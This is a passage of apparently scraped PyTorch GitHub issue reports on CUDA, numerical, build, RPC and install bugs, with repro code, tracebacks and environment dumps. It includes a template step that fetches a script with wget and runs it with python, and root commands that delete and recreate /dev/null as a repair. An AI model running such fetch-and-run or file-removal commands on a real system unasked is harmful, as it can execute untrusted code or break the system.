Reported in the forum in [this post](https://discuss.pytorch.org/t/functional-max-pool1d-cuda-error-on-large-tensor/81985) by Robert-Jan Bruintjes.

Minimal code snippet copied from the post:
```python
import torch
import torch.nn.functional as F

x = 6.
size = 10. ** 6
print(f""Size of second dimension: {int(size)}"")
poolsize = 4
x = torch.rand((1,int(size),poolsize), requires_grad=True).to('cuda:0')
y = F.max_pool1d(x.contiguous(), kernel_size=poolsize, stride=None, padding=0)

loss = torch.sum(y)
loss.backward()

""""""
Traceback (most recent call last):
  File ""efficient-segmentation/minimal_example.py"", line 14, in <module>
    loss.backward()
  File ""/home/nfs/username/miniconda3/envs/pytorch-cuda10/lib/python3.7/site-packages/torch/tensor.py"", line 184, in backward
    torch.autograd.backward(self, gradient, retain_graph, create_graph)
  File ""/home/nfs/username/miniconda3/envs/pytorch-cuda10/lib/python3.7/site-packages/torch/autograd/__init__.py"", line 123, in backward
    allow_unreachable=True)  # allow_unreachable flag
RuntimeError: CUDA error: an illegal memory access was encountered
...
```

Verified with latest nightly binary `1.6.0.dev20200506-py3.7_cuda10.2.89`

CUDA core dump yields:
```
CUDA Exception: Warp Illegal Address
The exception was triggered at PC 0x5591bfb37ca0
[Current focus set to CUDA kernel 0, grid 7, block (0,0,160), thread (0,0,0), device 0, sm 0, warp 16, lane 0]
#0  0x00005591bfb37cc0 in void at::native::(anonymous namespace)::max_pool_backward_nchw<float, float>(int, float const*, long const*, int, int, int, int, int, int, int, int, int, int, int, int, int, int, float*)
   <<<(1,1,65535),(256,1,1)>>> ()
```

CC @xwang233 to take a shot at it.


cc @ngimel @albanD @mruberry",True
torch.mean returns a wildly incorrect result 0.3277 on YCbCr version of CIFAR10 on CPU with dtype=float32 high priority module: numerical-stability triaged module: type promotion module: correctness (silent),"## üêõ Bug

When I load CIFAR10 training dataset, convert it to YCbCr, convert it to tensors, transpose it to HWC format and turn it into one large CPU float32 tensor and calculate its channels means, the result is wildly incorrect.

Also, the incorrect result it produces is (0.3277, 0.3277, 0.3277) - the same as reported in https://github.com/pytorch/pytorch/issues/10248, where the author doesn't even convert it to YCbCr. I think this suggests that this is just some bug in `torch.mean`. Also, on my local machine I only encounter this bug if I try to calculate mean for all 3 channels at once. If I instead calculate it for only one channel, I don't get 0.3277.

## To Reproduce

Code snippet:

```python
from typing import Tuple
from PIL.Image import Image
from einops import rearrange # pip install einops
import torch
from torchvision.datasets import CIFAR10
from torchvision.transforms.functional import to_tensor

tv_ds = CIFAR10(""."", download=True)
YCbCr_images: Tuple[Image, ...] = tuple(image.convert(""YCbCr"") for image, label in tv_ds)
tensors: Tuple[torch.Tensor, ...] = tuple(
    rearrange(to_tensor(image), ""c h w -> h w c"") for image in YCbCr_images
)
x = torch.stack(tensors).unsqueeze(0)  # 1 √ó 50000 √ó 32 √ó 32 √ó 3                                                                                                                                                                             
x_flattened = x.reshape(-1, 3)
print(x_flattened.mean(dim=0))  # (0.3277, 0.3277, 0.3277)                                                                                                                                                                                   
for channel in range(3):
    print(x_flattened[:, channel].mean())  # 0.3277, 0.3277, 0.3277 on google colab, but 0.4794, 0.4916, 0.5037 on my local machine                                                                                                                                                                     
print(x_flattened.double().mean(dim=0))  # (0.4790, 0.4809, 0.5077)                                                                                                                                                                          
print(x_flattened.cuda().mean(dim=0))  # (0.4790, 0.4809, 0.5077)
```

[Google colab link](https://colab.research.google.com/drive/1hV54M8zH3Cpx6n-A-JHSSuCVnZ1oBvdC?usp=sharing)

## Expected behavior

I expect to get the correct result rather than (0.3277, 0.3277, 0.3277).

## Environment

On my local machine:

```
Collecting environment information...
PyTorch version: 1.4.0
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Debian GNU/Linux 10 (buster)
GCC version: (Debian 8.3.0-6) 8.3.0
CMake version: version 3.13.4

Python version: 3.8
Is CUDA available: Yes
CUDA runtime version: 9.2.148
GPU models and configuration: 
GPU 0: GeForce RTX 2080 SUPER
GPU 1: GeForce GTX 1070

Nvidia driver version: 418.113
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.16.2
[conda] cudatoolkit               10.1.243             h6bb024c_0  
[conda] mkl                       2020.0                      166    conda-forge
[conda] numpy                     1.18.1           py38h95a1406_0    conda-forge
[conda] pytorch                   1.4.0           py3.8_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] pytorch-ignite            0.3.0                    pypi_0    pypi
[conda] pytorch-lightning         0.7.1                    pypi_0    pypi
[conda] torchvision               0.5.0                py38_cu101    pytorch
```

On google colab:

```
Collecting environment information...
PyTorch version: 1.5.0+cu101
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
CMake version: version 3.12.0

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: Tesla K80
Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.4
[pip3] torch==1.5.0+cu101
[pip3] torchsummary==1.5.1
[pip3] torchtext==0.3.1
[pip3] torchvision==0.6.0+cu101
[conda] Could not collect
```

cc @ezyang @gchanan @zou3519 @nairbv",True
torch.einsum does not pass equation argument to __torch_function__ API triaged module: numpy,"## üêõ Bug

when delegating torch.einsum call to an object which implements
`__torch_function__` API the equation argument is not passed resulting in the error.
```TypeError: einsum(): argument 'equation' (position 1) must be str, not Tensor```

this was tested on pytorch 1.5.0

I've actually found the cause of this bug and have written a fix.

the following script illustrates the problem and the proposed solution

## To Reproduce

```python 
import torch

class Wrapper():
    def __init__(self,data):
        self.data = data
    
    def __torch_function__(self, func, types, args=(), kwargs=None):
        if kwargs is None:
            kwargs = {}

        #unwrap inputs if necessary
        def unwrap(v):
            return v.data if isinstance(v,Wrapper) else v
        args = map(unwrap,args)
        kwargs = {k:unwrap(v) for k,v in kwargs.items()}

        return func(*args, **kwargs)



# fixed einsum implementation
from torch import Tensor,_VF
from torch._overrides import has_torch_function,handle_torch_function
def fixed_einsum(equation,*operands):
    if not torch.jit.is_scripting():
        if any(type(t) is not Tensor for t in operands) and has_torch_function(operands):
            # equation is not passed
            # return handle_torch_function(einsum, operands, *operands)
            return handle_torch_function(fixed_einsum, operands, equation,*operands)
    if len(operands) == 1 and isinstance(operands[0], (list, tuple)):
        # the old interface of passing the operands as one list argument
        operands = operands[0]

        # recurse incase operands contains value that has torch function
        #in the original implementation this line is omitted
        return fixed_einsum(equation,*operands)

    return _VF.einsum(equation, operands)


if __name__ == ""__main__"":
    print(torch.__version__)
    # uncomment to use fixed einsum
    # torch.einsum = fixed_einsum

    #operands are wrapped
    x = Wrapper(torch.randn(5))
    y = Wrapper(torch.randn(4))
    assert torch.allclose(torch.einsum('i,j->ij',x, y),torch.ger(x,y))  # outer product
    print(""works with wrapped inputs"")    

    #old interface operands is a list
    a = Wrapper(torch.randn(2,3))
    b = Wrapper(torch.randn(5,3,7))
    c = Wrapper(torch.randn(2,7))
    assert torch.allclose(torch.einsum('ik,jkl,il->ij', [a, b, c]),torch.nn.functional.bilinear(a,c,b)) # bilinear interpolation
    print(""works with old API operands is list"")
    
    #equation is wrapped
    As = Wrapper(torch.randn(3,2,5))
    Bs = Wrapper(torch.randn(3,5,4))
    equation = Wrapper('bij,bjk->bik')
    assert torch.allclose(torch.einsum(equation, As, Bs),torch.matmul(As,Bs)) # batch matrix multiplication
    print(""works with equation wrapped"")

    #see that it also works with plain tensors
    x = torch.randn(5)
    y = torch.randn(4)
    assert torch.allclose(torch.einsum('i,j->ij',x, y),torch.ger(x,y)) 
    print(""works with no wrapped values"")



```


cc @albanD @mruberry",True
CUDA debug build failed on Windows high priority module: build module: windows triaged,"## üêõ Bug

<!-- A clear and concise description of what the bug is. -->
Error text:
```
[2034/2674] Building NVCC (Device) object caffe2/CMakeFiles/torch_cuda.dir/utils/torch_cuda_generated_math_gpu.cu.obj
FAILED: caffe2/CMakeFiles/torch_cuda.dir/utils/torch_cuda_generated_math_gpu.cu.obj 
cmd.exe /C ""cd /D C:\w\b\windows\pytorch\build\build\caffe2\CMakeFiles\torch_cuda.dir\utils && C:\w\b\windows\conda\envs\py37\Library\bin\cmake.exe -E make_directory C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/. && C:\w\b\windows\conda\envs\py37\Library\bin\cmake.exe -D verbose:BOOL=OFF -D build_configuration:STRING=Debug -D generated_file:STRING=C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/./torch_cuda_generated_math_gpu.cu.obj -D generated_cubin_file:STRING=C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/./torch_cuda_generated_math_gpu.cu.obj.cubin.txt -P C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/torch_cuda_generated_math_gpu.cu.obj.Debug.cmake""
math_gpu.cu
C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<const     ::__half *,  ::thrust::device_allocator<const     ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/contiguous_storage.inl(282): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::contiguous_storage<    ::__half *,  ::thrust::device_allocator<    ::__half *> > ::uninitialized_copy<    ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/allocator_traits.inl(359): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(218): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::allocator_traits_detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<const     ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<const     ::__half *> > > ,  ::thrust::device_ptr<const     ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2\include\thrust/detail/allocator/copy_construct_range.inl(291): error: calling a __host__ function(""std::_Iterator_base12::~_Iterator_base12"") from a __host__ __device__ function(""thrust::detail::copy_construct_range< ::thrust::system::cpp::detail::tag,  ::thrust::device_allocator<    ::__half *> ,     ::std::_Vector_const_iterator<    ::std::_Vector_val<    ::std::_Simple_types<    ::__half *> > > ,  ::thrust::device_ptr<    ::__half *> > "") is not allowed

24 errors detected in the compilation of ""C:/Users/circleci/AppData/Local/Temp/tmpxft_0000018c_00000000-12_math_gpu.compute_75.cpp1.ii"".
math_gpu.cu
CMake Error at torch_cuda_generated_math_gpu.cu.obj.Debug.cmake:281 (message):
  Error generating file
  C:/w/b/windows/pytorch/build/build/caffe2/CMakeFiles/torch_cuda.dir/utils/./torch_cuda_generated_math_gpu.cu.obj
```
See https://app.circleci.com/pipelines/github/pytorch/pytorch/165899/workflows/977c46e5-2bfd-4a99-aa57-e6ce50d20cfc/jobs/5383261.

## To Reproduce

Steps to reproduce the behavior:

1. set DEBUG=1
2. python tools/build_libtorch.py

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

Build pass.

<!-- A clear and concise description of what you expected to happen. -->

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

 - PyTorch Version (e.g., 1.0): master
 - OS (e.g., Linux): Windows
 - How you installed PyTorch (`conda`, `pip`, source): source
 - Build command you used (if compiling from source): python tools/build_libtorch.py
 - Python version: 3.7
 - CUDA/cuDNN version: CUDA 9.2/10.1/10.2
 - GPU models and configuration: Tesla T4
 - Any other relevant information:

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @malfet @peterjc123 @nbcsm @guyang3532",True
Better testing on CPUs without AVX capabilities module: build module: cpu triaged,"https://github.com/pytorch/pytorch/issues/37577 is the latest occurrence of cases where we broke users with non-AVX CPUs because we accidentally let AVX instructions sneak in to code that isn't guarded by DispatchStub. It would be good to actually test for this case.

According to @colesbury, there are no x86 CPUs on AWS that don't support AVX.

Another test we could do is a limited test to see if our static initializers have any AVX instructions, or files that aren't explicitly intended to be AVX/AVX2 compiled. This might be hard to do robustly.

Possibly related https://github.com/pytorch/pytorch/issues/22338

cc @malfet @VitalyFedyunin",True
C++ API for Transformer model in libtorch 1.5.0 module: cpp triaged oncall: transformer/mha,"In the latest 1.5 release, I am unable to find Transformer model api in C++ (equivalent to the torch.nn.Transformer in its python counterpart). Any timeline for its implementation in C++?

cc @yf225 @glaringlee",True
"""sub_iter.strides(0)[0] == 0 INTERNAL ASSERT FAILED at Reduce.cuh"" when doing .sum() on large cuda tensor high priority module: cuda module: memory usage triaged module: reductions","## üêõ Bug

<!-- A clear and concise description of what the bug is. -->
Calling `.sum()` on large cuda tensors throws the error.

## To Reproduce

Steps to reproduce the behavior:

```
import torch
t = torch.zeros(5, 14400, 14400).cuda()
!nvidia-smi
t.sum(dim=0)
```
shows the following nvidia info
```
+-----------------------------------------------------------------------------+
| NVIDIA-SMI 440.64.00    Driver Version: 418.67       CUDA Version: 10.1     |
|-------------------------------+----------------------+----------------------+
| GPU  Name        Persistence-M| Bus-Id        Disp.A | Volatile Uncorr. ECC |
| Fan  Temp  Perf  Pwr:Usage/Cap|         Memory-Usage | GPU-Util  Compute M. |
|===============================+======================+======================|
|   0  Tesla P100-PCIE...  Off  | 00000000:00:04.0 Off |                    0 |
| N/A   40C    P0    32W / 250W |   4663MiB / 16280MiB |      0%      Default |
+-------------------------------+----------------------+----------------------+
                                                                               
+-----------------------------------------------------------------------------+
| Processes:                                                       GPU Memory |
|  GPU       PID   Type   Process name                             Usage      |
|=============================================================================|
+-----------------------------------------------------------------------------+
```
and the traceback is
```
RuntimeError                              Traceback (most recent call last)
<ipython-input-1-bbe24183337c> in <module>()
      2 t = torch.zeros(5, 14400, 14400).cuda()
      3 get_ipython().system('nvidia-smi')
----> 4 t.sum(dim=0)

RuntimeError: sub_iter.strides(0)[0] == 0 INTERNAL ASSERT FAILED at /pytorch/aten/src/ATen/native/cuda/Reduce.cuh:706, please report a bug to PyTorch. 
```

This behavior is reproduced with any `(n, 14400, 14400)` tensor for `n>=5`.

**Note**. I can easily create a (6, 14400, 14400) tensor - memory usage, in this case, is `5455MiB / 16280MiB`.


## Expected behavior
Returns a (14400, 14400) tensor


## Environment

PyTorch version: 1.5.0+cu101
Is debug build: No
CUDA used to build PyTorch: 10.1

OS: Ubuntu 18.04.3 LTS
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
CMake version: version 3.12.0

Python version: 3.6
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration: GPU 0: Tesla P100-PCIE-16GB
Nvidia driver version: 418.67
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.3
[pip3] pytorch-mighty==0.1.0
[pip3] torch==1.5.0+cu101
[pip3] torchfile==0.1.0
[pip3] torchsummary==1.5.1
[pip3] torchtext==0.3.1
[pip3] torchvision==0.6.0+cu101
[conda] Could not collect


## Additional context

Google colab, GPU instance.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @ngimel @heitorschueroff",True
Running python tests as root breaks the /dev/null file oncall: distributed triaged,"## üêõ Bug

Running python tests as root breaks the `/dev/null` file

## To Reproduce

Steps to reproduce the behavior:

1. `su - root`
1. `python3 test/run_tests.py -v -pt`

After that the `/dev/null` file is no longer a character device file but a plain one.

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

It should not break things of the system.

## Environment

Linux

## Additional context

I've found the root of the problem:

`test_c10d.py` has a test case that creates a `c10d.FileStore(""/dev/null"", 1)` instance:
https://github.com/pytorch/pytorch/blob/master/test/distributed/test_c10d.py#L2956

And the `c10d.FileStore` object will remove the file specified by that path upon destruction:
https://github.com/pytorch/pytorch/blob/master/torch/lib/c10d/FileStore.cpp#L229

Should anyone encountered this issue, it can be fixed by simple re-creating the `/dev/null` file:

```shell
rm -f /dev/null
 mknod -m 666 /dev/null c 1 3
```

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar",True
MacOS install error: Library not loaded: @rpath/libc++.1.dylib high priority module: binaries triaged module: macos,"## üêõ Bug

Install on MacOS fails with pip. 

## To Reproduce

```
(venv) ‚ûú  whatlies git:(master) ‚úó python -m pip install torch
(venv) ‚ûú  whatlies git:(master) ‚úó python                            
Python 3.7.7 (v3.7.7:d7c567b08f, Mar 10 2020, 02:56:16) 
[Clang 6.0 (clang-600.0.57)] on darwin
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> import torch
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
  File ""/Users/vincent/Development/whatlies/venv/lib/python3.7/site-packages/torch/__init__.py"", line 81, in <module>
    from torch._C import *
ImportError: dlopen(/Users/vincent/Development/whatlies/venv/lib/python3.7/site-packages/torch/_C.cpython-37m-darwin.so, 9): Library not loaded: @rpath/libc++.1.dylib
  Referenced from: /Users/vincent/Development/whatlies/venv/lib/python3.7/site-packages/torch/_C.cpython-37m-darwin.so
  Reason: image not found
```

Google suggested doing this; 

```
(venv) ‚ûú  whatlies git:(master) ‚úó brew install libomp               
```

That unfortunately did not work. 

## Expected behavior

No error. 

## Environment

```
(venv) ‚ûú  whatlies git:(master) ‚úó python collect_env.py 
Collecting environment information...
PyTorch version: N/A
Is debug build: N/A
CUDA used to build PyTorch: N/A

OS: Mac OSX 10.15.3
GCC version: Could not collect
CMake version: Could not collect

Python version: 3.7
Is CUDA available: N/A
CUDA runtime version: Could not collect
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Could not collect

Versions of relevant libraries:
[pip3] numpy==1.18.3
[pip3] torch==1.3.1
[pip3] torchvision==0.5.0
[conda] Could not collect
```

cc @ezyang @gchanan @zou3519 @bdhirsh @seemethere @malfet @walterddr",True
Make RPC internal messages/callbacks work with single-threaded agent triaged module: rpc,"@lw and @jiayisuse brought up a great point that RPC system should work correctly even if the agent only uses a single thread to process all internal messages. Otherwise, the correctness of RPC will depend on the thread number configuration, which is not ideal. Currently, RPC does not work that way, as there are still multiple places that block and require a different thread to unblock. Creating this issue to track progression to make RPC compatible with single-threaded agent implementation. This is required by `TensorPipe` integration.

- [x] `RRef.to_here()`(i.e., `SCRIPT_RREF_FETCH_CALL` and `PYTHON_RREF_FETCH_CALL`) blocks until the owner RRef is created. It should return a future instead. (#36805 )
- [x] For `OwnerRRef`, `PyRRef::unpickle` blocks until the `OwnerRRef` is created. Since `RRefForkData` already contains the `TypePtr`, it can instead directly create the `OwnerRRef` instance. (@wanchaol please correct me if I am wrong, thx!)  (#36785)

cc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @gqchen @aazzolini @rohan-varma @xush6528 @jjlilley @osalpekar",True
AMP autocast error in cnn-lstm forward module: cudnn triaged,"## üêõ Bug

get cuDNN error: CUDNN_STATUS_BAD_PARAM in cnn-lstm network forward method

## To Reproduce

```
import torch
from torch import nn, optim
from torch.cuda.amp import GradScaler, autocast

class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.conv1 = nn.Conv1d(1, 10, 2)
        self.lstm = nn.LSTM(input_size=10, hidden_size=10,
                                batch_first=True,bidirectional=True)

    def forward(self, x):
        x = self.conv1(x)
        x = x.permute(0, 2, 1)
        x, _ = self.lstm(x)
        return x


net = Net().cuda()
net.train()
